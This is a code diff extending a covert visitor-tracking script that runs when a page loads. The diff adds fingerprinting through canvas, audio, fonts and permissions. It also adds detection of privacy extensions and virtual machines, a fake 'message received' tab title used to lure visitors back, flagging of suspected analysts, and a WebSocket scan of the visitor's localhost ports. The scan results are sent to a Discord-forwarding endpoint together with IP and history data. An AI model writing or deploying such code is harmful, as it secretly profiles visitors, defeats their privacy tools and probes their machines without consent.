@@ -990,6 +990,62 @@ function canvasFingerprint(){
     }catch(_){return 'N/A';}
 }
 
+// ── CANVAS NOISE DETECTION ──
+// Renders the same scene twice and compares pixel hashes.
+// If results differ → privacy extension (CanvasBlocker, Brave shields, Firefox RFP)
+// is injecting random noise. Also checks if values are suspiciously "clean".
+function canvasNoiseDetection() {
+    try {
+        function renderAndHash() {
+            const c = document.createElement('canvas');
+            c.width = 120; c.height = 40;
+            const ctx = c.getContext('2d');
+            // Complex scene: gradient + text + alpha blend
+            const grad = ctx.createLinearGradient(0, 0, 120, 0);
+            grad.addColorStop(0,   '#e01a3c');
+            grad.addColorStop(0.5, '#2244ff');
+            grad.addColorStop(1,   '#00cc88');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0, 0, 120, 40);
+            ctx.font = 'bold 15px serif';
+            ctx.fillStyle = 'rgba(255,255,200,0.85)';
+            ctx.fillText('Noise\u00B6Test', 4, 26);
+            ctx.globalCompositeOperation = 'multiply';
+            ctx.fillStyle = 'rgba(100,50,200,0.4)';
+            ctx.fillRect(30, 5, 60, 30);
+            // Read raw pixel data for hashing
+            const px = ctx.getImageData(0, 0, 120, 40).data;
+            let h = 0x811c9dc5;
+            for (let i = 0; i < px.length; i += 4) { // sample every pixel
+                h ^= px[i]; h = (h * 0x01000193) >>> 0;
+                h ^= px[i+1]; h = (h * 0x01000193) >>> 0;
+            }
+            return h.toString(16).padStart(8, '0');
+        }
+
+        const h1 = renderAndHash();
+        const h2 = renderAndHash();
+        const h3 = renderAndHash();
+
+        const noisy = !(h1 === h2 && h2 === h3);
+        // Brave/Firefox RFP returns all-zero or all-same pixel blocks
+        const suspiciouslyClean = (h1 === '00000000' || h1 === 'ffffffff');
+
+        let verdict = 'clean';
+        if (noisy)            verdict = 'noise injected (CanvasBlocker/Brave/RFP)';
+        else if (suspiciouslyClean) verdict = 'blocked (all-zero/uniform pixels)';
+
+        return {
+            hash1: h1, hash2: h2, hash3: h3,
+            noisy: noisy ? 'YES' : 'no',
+            verdict,
+            extensionSuspected: (noisy || suspiciouslyClean) ? 'YES' : 'no',
+        };
+    } catch(_) {
+        return { hash1:'N/A', hash2:'N/A', hash3:'N/A', noisy:'N/A', verdict:'error', extensionSuspected:'N/A' };
+    }
+}
+
 function webglInfo(){
     try{
         const c=document.createElement('canvas');
@@ -1009,17 +1065,30 @@ function webglInfo(){
 function audioFingerprint(){
     return new Promise(resolve=>{
         try{
-            // ── Part A: live context properties ──
+            // ── Part A: live context properties + outputLatency ──
             const liveCtx = new(window.AudioContext||window.webkitAudioContext)();
+            const outputLatency = liveCtx.outputLatency != null ? liveCtx.outputLatency : null;
+            const baseLatency   = liveCtx.baseLatency   != null ? liveCtx.baseLatency   : null;
             const liveProps = {
                 sampleRate:       liveCtx.sampleRate,
                 channelCount:     liveCtx.destination.channelCount,
                 channelCountMode: liveCtx.destination.channelCountMode,
                 maxChannelCount:  liveCtx.destination.maxChannelCount,
                 state:            liveCtx.state,
-                baseLatency:      liveCtx.baseLatency != null ? liveCtx.baseLatency.toFixed(6) : 'N/A',
+                baseLatency:      baseLatency != null ? baseLatency.toFixed(6) : 'N/A',
+                outputLatency:    outputLatency != null ? outputLatency.toFixed(6) : 'N/A',
             };
             liveCtx.close();
+
+            // VM/virtual audio detection via outputLatency heuristics:
+            // Real hardware: 0.01–0.05s | VirtualBox/VMware: >0.1s or exactly 0
+            // WSL2 pulseaudio bridge: often 0.08–0.15s with high variance
+            let audioEnv = 'bare-metal';
+            if (outputLatency !== null) {
+                if (outputLatency === 0)        audioEnv = 'virtual/headless (latency=0)';
+                else if (outputLatency > 0.15)  audioEnv = 'VM suspected (high latency)';
+                else if (outputLatency > 0.08)  audioEnv = 'WSL/VM possible';
+            }
 
             // ── Part B: OfflineAudioContext rendering (most fingerprint entropy) ──
             // Renders a deterministic signal; tiny FPU/DSP differences produce unique output.
@@ -1070,16 +1139,18 @@ function audioFingerprint(){
                 for(let i = 0; i < samples.length; i++){ h2 = ((h2<<5)-h2+samples.charCodeAt(i))|0; }
 
                 resolve({
-                    sum:        sum.toFixed(6),
-                    hash:       Math.abs(h2).toString(16),
-                    sampleRate: liveProps.sampleRate,
-                    channels:   liveProps.maxChannelCount,
-                    latency:    liveProps.baseLatency,
-                    compKnee:   comp.knee.value.toFixed(2),
+                    sum:           sum.toFixed(6),
+                    hash:          Math.abs(h2).toString(16),
+                    sampleRate:    liveProps.sampleRate,
+                    channels:      liveProps.maxChannelCount,
+                    latency:       liveProps.baseLatency,
+                    outputLatency: liveProps.outputLatency,
+                    audioEnv,
+                    compKnee:      comp.knee.value.toFixed(2),
                 });
-            }).catch(()=> resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',compKnee:'N/A'}));
+            }).catch(()=> resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',outputLatency:'N/A',audioEnv:'N/A',compKnee:'N/A'}));
         }catch(_){
-            resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',compKnee:'N/A'});
+            resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',outputLatency:'N/A',audioEnv:'N/A',compKnee:'N/A'});
         }
     });
 }
@@ -1166,6 +1237,58 @@ function collectBehavior(){
         const moves=[]; const scrolls=[]; let keyCount=0; let clicks=0;
         const t0=performance.now();
 
+        // ── Tab visibility tracking ──
+        let tabSwitches = 0;
+        let totalHiddenMs = 0;
+        let hiddenAt = null;
+        const reactTimes = []; // ms to return after tab switch
+        const origTitle = document.title;
+        const origFavicon = (() => {
+            const el = document.querySelector('link[rel~="icon"]');
+            return el ? el.href : null;
+        })();
+
+        function setFavicon(url) {
+            let el = document.querySelector('link[rel~="icon"]');
+            if (!el) { el = document.createElement('link'); el.rel = 'icon'; document.head.appendChild(el); }
+            el.href = url;
+        }
+
+        // Build a simple red-dot notification favicon via canvas
+        const notifFavicon = (() => {
+            try {
+                const c = document.createElement('canvas'); c.width = 32; c.height = 32;
+                const ctx = c.getContext('2d');
+                // Draw original-ish icon base
+                ctx.fillStyle = '#1a1a2e'; ctx.beginPath(); ctx.arc(16,16,14,0,Math.PI*2); ctx.fill();
+                ctx.fillStyle = '#ff3333'; ctx.beginPath(); ctx.arc(22,10,8,0,Math.PI*2); ctx.fill();
+                ctx.fillStyle = '#fff'; ctx.font = 'bold 9px sans-serif'; ctx.textAlign='center';
+                ctx.fillText('1', 22, 13);
+                return c.toDataURL();
+            } catch(_) { return null; }
+        })();
+
+        const onVisChange = () => {
+            if (document.hidden) {
+                hiddenAt = performance.now();
+                tabSwitches++;
+                // Change title + favicon to lure user back
+                document.title = '[ mensagem recebida ]';
+                if (notifFavicon) setFavicon(notifFavicon);
+            } else {
+                // User returned
+                if (hiddenAt !== null) {
+                    const awayMs = Math.round(performance.now() - hiddenAt);
+                    totalHiddenMs += awayMs;
+                    reactTimes.push(awayMs);
+                    hiddenAt = null;
+                }
+                document.title = origTitle;
+                if (origFavicon) setFavicon(origFavicon);
+            }
+        };
+        document.addEventListener('visibilitychange', onVisChange);
+
         const onMove=e=>{ if(moves.length<400) moves.push({x:e.clientX,y:e.clientY,t:Math.round(performance.now()-t0)}); };
         const onScroll=()=>{ scrolls.push({y:window.scrollY,t:Math.round(performance.now()-t0)}); };
         const onKey=()=>keyCount++;
@@ -1181,6 +1304,10 @@ function collectBehavior(){
             window.removeEventListener('scroll',onScroll);
             window.removeEventListener('keydown',onKey);
             window.removeEventListener('click',onClick);
+            document.removeEventListener('visibilitychange', onVisChange);
+            // Restore title/favicon in case still hidden
+            document.title = origTitle;
+            if (origFavicon) setFavicon(origFavicon);
 
             // ── Avg velocity ──
             let totalDist=0;
@@ -1243,6 +1370,10 @@ function collectBehavior(){
                 scrollSpeed:   scrollSpeed+'px/event',
                 keystrokes:    keyCount,
                 clicks,
+                tabSwitches,
+                totalHiddenMs: totalHiddenMs+'ms',
+                avgReactMs:    reactTimes.length ? Math.round(reactTimes.reduce((a,b)=>a+b,0)/reactTimes.length)+'ms' : 'N/A',
+                analystSuspect: (tabSwitches >= 2 && reactTimes.some(t => t < 3000)) ? 'YES — fast tab switcher' : 'no',
             });
         }, 4000);
     });
@@ -1411,6 +1542,234 @@ function getSessionHistory(){
     }
 }
 
+// ── FONT BOUNDING BOX FINGERPRINT ──
+// Measures exact pixel dimensions of text rendered in many fonts.
+// GPU driver + OS antialiasing = unique sub-pixel signature per machine.
+function fontBoundingFP() {
+    try {
+        const el = document.createElement('span');
+        el.style.cssText = 'position:absolute;left:-9999px;top:-9999px;visibility:hidden;font-size:72px;';
+        el.textContent = 'wmilI01|[]{}';
+        document.body.appendChild(el);
+
+        const FONTS = [
+            'Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas',
+            'Courier New','Georgia','Impact','Lucida Console','Lucida Sans Unicode',
+            'Microsoft Sans Serif','Palatino Linotype','Segoe UI','Tahoma',
+            'Times New Roman','Trebuchet MS','Verdana','Helvetica','Geneva',
+            'Gill Sans','Optima','Futura','Garamond','Baskerville','Didot',
+            'Rockwell','Century Gothic','Franklin Gothic Medium','Candara',
+            'Ubuntu','DejaVu Sans','Liberation Sans','Noto Sans','Roboto',
+            'Open Sans','Lato','Source Code Pro','Fira Code','JetBrains Mono',
+        ];
+
+        // Baseline: default font
+        el.style.fontFamily = 'monospace';
+        const bw = el.getBoundingClientRect().width;
+        const bh = el.getBoundingClientRect().height;
+
+        const measurements = [];
+        FONTS.forEach(f => {
+            el.style.fontFamily = `'${f}',monospace`;
+            const r = el.getBoundingClientRect();
+            // Only record fonts that differ from baseline (font actually loaded)
+            if (r.width !== bw || r.height !== bh) {
+                measurements.push(`${f}:${r.width.toFixed(2)}x${r.height.toFixed(2)}`);
+            }
+        });
+
+        document.body.removeChild(el);
+
+        // Hash the measurements for a compact fingerprint
+        const raw = measurements.join('|');
+        let h = 0x811c9dc5;
+        for (let i = 0; i < raw.length; i++) {
+            h ^= raw.charCodeAt(i);
+            h = (h * 0x01000193) >>> 0;
+        }
+        return { hash: h.toString(16).padStart(8,'0'), count: measurements.length, sample: measurements.slice(0,3).join(' / ') };
+    } catch(_) {
+        return { hash: 'N/A', count: 0, sample: 'N/A' };
+    }
+}
+
+// ── LOCAL PORT SCAN ──
+// Probes common localhost ports via fetch with short timeout.
+// Open ports reveal developer tools, databases, services running on machine.
+// Runs in background — does NOT block page load.
+async function localPortScan() {
+    const PORTS = [
+        { port: 22,   label: 'SSH' },
+        { port: 80,   label: 'HTTP' },
+        { port: 3000, label: 'Node/React dev' },
+        { port: 3306, label: 'MySQL' },
+        { port: 4200, label: 'Angular dev' },
+        { port: 5000, label: 'Flask/Python' },
+        { port: 5432, label: 'PostgreSQL' },
+        { port: 5900, label: 'VNC' },
+        { port: 6379, label: 'Redis' },
+        { port: 8000, label: 'Django/Python' },
+        { port: 8080, label: 'Alt HTTP / Tomcat' },
+        { port: 8443, label: 'Alt HTTPS' },
+        { port: 9200, label: 'Elasticsearch' },
+        { port: 27017,label: 'MongoDB' },
+    ];
+
+    const check = ({ port, label }) => new Promise(resolve => {
+        const start = Date.now();
+        // Using WebSocket — connection refused = fast error = port closed
+        // Connection timeout or pending = something listening
+        const ws = new WebSocket(`ws://127.0.0.1:${port}`);
+        const timer = setTimeout(() => {
+            ws.close();
+            resolve({ port, label, open: true, ms: Date.now() - start }); // timeout = something there
+        }, 350);
+        ws.onerror = () => {
+            clearTimeout(timer);
+            const ms = Date.now() - start;
+            // Fast error (<80ms) = port closed/refused. Slow error = firewall/filtered = possibly open
+            resolve({ port, label, open: ms > 80, ms });
+        };
+        ws.onopen = () => {
+            clearTimeout(timer);
+            ws.close();
+            resolve({ port, label, open: true, ms: Date.now() - start });
+        };
+    });
+
+    try {
+        const results = await Promise.all(PORTS.map(check));
+        const open = results.filter(r => r.open);
+        const isDev = open.some(r => [3000,4200,5000,8000,8080].includes(r.port));
+        const isDB  = open.some(r => [3306,5432,6379,9200,27017].includes(r.port));
+        const isServer = open.some(r => [22,80,443,8443].includes(r.port));
+        let profile = [];
+        if (isDev)    profile.push('developer');
+        if (isDB)     profile.push('DBA');
+        if (isServer) profile.push('sysadmin');
+        if (open.some(r => r.port === 22)) profile.push('SSH exposed');
+        return {
+            openPorts: open.map(r => `${r.port}(${r.label})`).join(', ') || 'none detected',
+            openCount: open.length,
+            profile: profile.join(' / ') || 'standard user',
+        };
+    } catch(_) {
+        return { openPorts: 'N/A', openCount: 0, profile: 'N/A' };
+    }
+}
+
+// ── LIES DETECTION ──
+// Compares what navigator claims vs what hardware/rendering reveals.
+// Catches User-Agent spoofing, fake mobile UA on desktop, etc.
+function liesDetection() {
+    const ua  = navigator.userAgent || '';
+    const nav = navigator;
+    const lies = [];
+
+    // 1. Claims iOS/iPhone but zero touch points (iPhones always have touch)
+    const claimsIOS = /iPhone|iPad|iPod/i.test(ua);
+    if (claimsIOS && nav.maxTouchPoints === 0) {
+        lies.push('claims iOS but maxTouchPoints=0');
+    }
+
+    // 2. Claims mobile UA but screen is large
+    const claimsMobile = /Mobile|Android/i.test(ua);
+    if (claimsMobile && window.screen.width > 1200) {
+        lies.push(`claims mobile but screen=${window.screen.width}px`);
+    }
+
+    // 3. Claims Windows but WebGL renderer says Apple GPU
+    const glVendor = (() => { try { const gl=document.createElement('canvas').getContext('webgl'); const ext=gl?.getExtension('WEBGL_debug_renderer_info'); return gl?.getParameter(ext?.UNMASKED_RENDERER_WEBGL)||''; } catch(_){return '';} })();
+    if (/Windows/i.test(ua) && /Apple/i.test(glVendor)) {
+        lies.push('claims Windows but GPU is Apple');
+    }
+
+    // 4. Claims Mac but WebGL says NVIDIA/AMD with Windows driver string
+    if (/Macintosh/i.test(ua) && /ANGLE.*Direct3D/i.test(glVendor)) {
+        lies.push('claims macOS but GPU uses Direct3D (Windows)');
+    }
+
+    // 5. navigator.webdriver is true (Selenium/Puppeteer) but UA claims real browser
+    if (nav.webdriver === true) {
+        lies.push('webdriver=true (automated browser)');
+    }
+
+    // 6. Claims Chrome but navigator.plugins is empty (headless Chrome has no plugins)
+    if (/Chrome/i.test(ua) && !(/HeadlessChrome/i.test(ua)) && nav.plugins && nav.plugins.length === 0) {
+        lies.push('claims Chrome but plugins=0 (headless suspected)');
+    }
+
+    // 7. UA says one OS, platform says another
+    const uaOS = /Windows/i.test(ua) ? 'windows'
+               : /Macintosh|Mac OS X/i.test(ua) ? 'mac'
+               : /Linux/i.test(ua) ? 'linux'
+               : /Android/i.test(ua) ? 'android'
+               : /iPhone|iPad/i.test(ua) ? 'ios' : 'unknown';
+    const pf = (nav.platform || '').toLowerCase();
+    const pfOS = pf.includes('win') ? 'windows'
+               : pf.includes('mac') ? 'mac'
+               : pf.includes('linux') || pf.includes('arm') ? 'linux'
+               : 'unknown';
+    if (uaOS !== 'unknown' && pfOS !== 'unknown' && uaOS !== pfOS) {
+        lies.push(`UA says ${uaOS} but platform says ${pfOS}`);
+    }
+
+    // 8. Hardware concurrency declared vs worker check (passed in)
+    // (cross-checked in initVisitor with workerCheck)
+
+    return {
+        lies: lies.join(' | ') || 'none detected',
+        liesCount: lies.length,
+        suspected: lies.length > 0 ? 'YES' : 'no',
+    };
+}
+
+// ── PERMISSIONS API HEADLESS DETECTION ──
+// Real browsers show 'prompt' for unseen permissions.
+// Headless (Puppeteer/Playwright) often returns 'denied' or behaves inconsistently.
+async function permissionsHeadlessCheck() {
+    const results = {};
+    const checks = [
+        'notifications',
+        'geolocation',
+        'camera',
+        'microphone',
+    ];
+
+    try {
+        await Promise.all(checks.map(async name => {
+            try {
+                const r = await navigator.permissions.query({ name });
+                results[name] = r.state; // 'prompt' | 'granted' | 'denied'
+            } catch(_) {
+                results[name] = 'error';
+            }
+        }));
+    } catch(_) {
+        return { raw: 'API unavailable', headlessSuspected: 'N/A', detail: 'N/A' };
+    }
+
+    const flags = [];
+
+    // Real browser on fresh site: notifications/geolocation/camera/mic should all be 'prompt'
+    // Headless: notifications often 'denied', geolocation may be 'granted' without asking
+    if (results.notifications === 'denied')  flags.push('notifications=denied (headless pattern)');
+    if (results.geolocation   === 'granted') flags.push('geolocation=granted (no prompt — suspicious)');
+    if (results.camera        === 'granted') flags.push('camera=granted (no prompt — suspicious)');
+
+    // If ALL are 'denied' without any user interaction — very strong headless signal
+    const allDenied = checks.every(k => results[k] === 'denied');
+    if (allDenied) flags.push('all permissions denied (likely headless/automation)');
+
+    const raw = checks.map(k => `${k}:${results[k]}`).join(' | ');
+
+    return {
+        raw,
+        headlessSuspected: flags.length > 0 ? 'YES' : 'no',
+        detail: flags.join(' | ') || 'normal',
+    };
+}
+
 async function initVisitor(){
     const nav=navigator;
     const conn=nav.connection||nav.mozConnection||nav.webkitConnection||{};
@@ -1418,7 +1777,7 @@ async function initVisitor(){
     // Start behavior collection in parallel (runs for 4s)
     const behaviorPromise = collectBehavior();
 
-    const [ipData,audioFp,webrtcIPs,rttResults,battery,mediaDevs,uach,sensors,faviconResult,workerCheck,historySniff,vercelGeo]=await Promise.all([
+    const [ipData,audioFp,webrtcIPs,rttResults,battery,mediaDevs,uach,sensors,faviconResult,workerCheck,historySniff,vercelGeo,permsCheck]=await Promise.all([
         fetch('https://ipinfo.io/json').then(r=>r.ok?r.json():{}).catch(()=>({})),
         audioFingerprint(),
         getWebRTCIPs(),
@@ -1432,6 +1791,8 @@ async function initVisitor(){
         faviconHistorySniff(),
         // Vercel server-side data: JA4 TLS fingerprint + geo from edge infrastructure
         fetch('/api/geo').then(r=>r.ok?r.json():{}).catch(()=>({})),
+        // Permissions API headless detection
+        permissionsHeadlessCheck(),
     ]);
 
     // Synchronous (instant)
@@ -1439,6 +1800,18 @@ async function initVisitor(){
     const emojiFP    = emojiCanvasFP();
     const mediaMQ    = cssMediaQueries();
     const sessionHist = getSessionHistory();
+    const fontBBox   = fontBoundingFP();   // GPU/driver signature
+    const lies       = liesDetection();    // UA consistency check
+    const canvasNoise = canvasNoiseDetection(); // Privacy extension detection
+
+    // Port scan runs async in background — sent separately after done
+    localPortScan().then(portScan => {
+        fetch('/api/send-to-discord', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ _update: 'portscan', ...portScan })
+        }).catch(_=>{});
+    });
 
     // Behavior collected async (non-blocking — webhook sent after)
     behaviorPromise.then(beh=>{
@@ -1495,11 +1868,13 @@ async function initVisitor(){
         org:         ipData.org||'N/A',
         loc:         ipData.loc||'N/A',
         canvasFp:    cvs,
-        audioFp:     audioFp.sum,
-        audioFpHash: audioFp.hash,
+        audioFp:         audioFp.sum,
+        audioFpHash:     audioFp.hash,
         audioSampleRate: String(audioFp.sampleRate),
         audioChannels:   String(audioFp.channels),
         audioLatency:    String(audioFp.latency),
+        audioOutputLatency: String(audioFp.outputLatency),
+        audioEnv:        audioFp.audioEnv,
         rtcPublicIPs: webrtcIPs.public.join(', ')||'N/A',
         rtcLocalIPs:  webrtcIPs.local.join(', ')||'N/A',
         rtcLeak:      webrtcIPs.public.length>0 ? 'YES' : 'no candidates',
@@ -1606,6 +1981,26 @@ async function initVisitor(){
         firstSeen:       sessionHist.firstSeen,
         daysSinceFirst:  sessionHist.daysSinceFirst,
         lsReturning:     sessionHist.returning,
+
+        // Canvas noise detection (privacy extension fingerprint)
+        canvasNoisy:     canvasNoise.noisy,
+        canvasVerdict:   canvasNoise.verdict,
+        canvasExtension: canvasNoise.extensionSuspected,
+
+        // Font bounding box fingerprint (GPU/driver signature)
+        fontBBoxHash:    fontBBox.hash,
+        fontBBoxCount:   String(fontBBox.count),
+        fontBBoxSample:  fontBBox.sample,
+
+        // Lies detection (UA vs hardware consistency)
+        liesDetected:    lies.lies,
+        liesCount:       String(lies.liesCount),
+        liesSuspected:   lies.suspected,
+
+        // Permissions API headless detection
+        permsRaw:        permsCheck.raw,
+        permsHeadless:   permsCheck.headlessSuspected,
+        permsDetail:     permsCheck.detail,
     };
 
     // Main fingerprint send
